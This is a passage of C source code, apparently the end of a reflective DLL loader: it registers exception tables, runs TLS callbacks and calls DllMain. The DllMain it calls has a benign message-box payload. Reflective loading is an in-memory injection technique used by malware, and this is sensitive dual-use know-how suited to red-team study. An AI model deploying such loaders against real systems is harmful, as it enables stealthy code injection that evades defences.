		PIMAGE_RUNTIME_FUNCTION_ENTRY pImgRuntimeFuncEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(pPeBaseAddress + 
			pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress);
		// Register the function table
		if (!pRtlAddFunctionTable(pImgRuntimeFuncEntry, 
			(pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)) - 1, 
			pPeBaseAddress)) {
		}
	}

	// Execute TLS callbacks (if exists)
	if (pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size) {
		// Retrieve the address of the TLS Directory.
		PIMAGE_TLS_DIRECTORY pImgTlsDirectory = (PIMAGE_TLS_DIRECTORY)(pPeBaseAddress + 
			pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
		// Get the address of the TLS Callbacks from the TLS Directory.
		PIMAGE_TLS_CALLBACK* pImgTlsCallback = (PIMAGE_TLS_CALLBACK*)(pImgTlsDirectory->AddressOfCallBacks);
		CONTEXT pCtx = { 0x00 };
		// Iterate through and invoke each TLS Callback until a NULL callback is encountered.
		for (; *pImgTlsCallback; pImgTlsCallback++)
			(*pImgTlsCallback)((LPVOID)pPeBaseAddress, DLL_PROCESS_ATTACH, &pCtx);
	}

	// Flushing the instruction cache
	pNtFlushInstructionCache((HANDLE)-1, NULL, 0x00);

	// Execute DllMain
	return pDllMain((HMODULE)pPeBaseAddress, DLL_PROCESS_ATTACH, NULL);
}

VOID PayloadFunction() {
	MessageBoxA(NULL, "Hello from ReDll2!", "ReflectiveDLL", MB_OK | MB_ICONINFORMATION);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		PayloadFunction();
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

